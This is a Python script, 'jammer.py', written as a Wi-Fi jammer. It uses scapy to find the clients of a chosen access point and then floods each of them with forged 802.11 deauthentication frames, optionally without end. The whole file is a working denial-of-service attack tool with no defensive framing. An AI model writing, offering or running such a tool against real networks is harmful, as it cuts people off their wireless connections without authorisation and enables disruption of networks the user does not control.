import datetime as dt
import scapy.all as scapy
from argparse import ArgumentParser
from scapy.layers.dot11 import Dot11Deauth, Dot11, RadioTap, Dot11Elt
import sys
from scapy.sendrecv import sniff

if sys.version_info < (3, 0):
    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
    sys.stderr.write("Please update and make sure you use the command python3 jammer.py <no. de-authentication frames "
                     "to send> <options <interface>\n\n")
    sys.exit(0)

def args():
    """get the user options from the terminal"""
    parser = ArgumentParser(description="Wi-Fi Jammer v1.0 @2023 - Saher Muhamed",
                            usage="python3 jammer.py <no. de-authentication frames to send> <options> <interface>")
    parser.add_argument("count", help="no. de-authentication frames to send, specify 0 to keep sending infinitely")
    parser.add_argument("-a", dest="bssid", help="set Access Point MAC address Example: -a qw:er:ty:ui:op:77")
    parser.add_argument("-i", "--interval", dest="interval", help="set Time between each frame. Example: -i 0.7",
                        default=0.0)
    parser.add_argument("interface", help="interface name in monitor mode", default="wlan0")
    options = parser.parse_args()
    if not options.interface:
        parser.error("please enter the interface name in monitor mode, or type it correctly, ex: wlan0")
    elif not options.bssid:
        parser.error("please enter the target access point MAC address to de-authenticate")
    return options

def deAuth(client, access_point, inter=0.0, count=None, loop=1, iface="wlan0", verbose=False):
    """this function craft a de-authentication frames ready to be sent"""
    deauth_packet = RadioTap() / Dot11(addr1=client, addr2=access_point, addr3=access_point) / Dot11Deauth(reason=7)
    scapy.sendp(deauth_packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)

def sniff_clients(ap_mac, iface):
    clients = set()

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 2 and pkt.addr1 != ap_mac and pkt.addr2 == ap_mac:
                clients.add(pkt.addr1)

    sniff(iface=iface, prn=packet_handler, timeout=10)
    return clients

option = args()

def main():
    print("\n[+] Start De-Auth Attack..")
    print(f"[+] Target BSSID                :{option.bssid}")
    print(f"[+] No.Deauth Packets           :{option.count}")
    print(f"[+] Working Wireless Card:      :{option.interface}")
    print(f"[+] Time:                       :{str(dt.datetime.now().strftime('%H:%M:%S'))}")
    print("==================================================")
    
    clients = sniff_clients(option.bssid, option.interface)
    print(f"[+] Discovered Clients:         :{', '.join(clients)}")
    
    while True:
        try:
            for client in clients:
                if int(option.count) == 0:
                    # if count is 0, it means loop forever (until user interrupt)
                    deAuth(client=client, access_point=option.bssid, iface=option.interface,
                           inter=float(option.interval))  # send de-auth packet
                else:
                    deAuth(client=client, access_point=option.bssid, count=int(option.count), loop=0,
                           iface=option.interface,
                           inter=float(option.interval))
        except KeyboardInterrupt:
            print("[-] Attack has been stopped successfully")
            sys.exit(0)

if __name__ == "__main__":
    main()
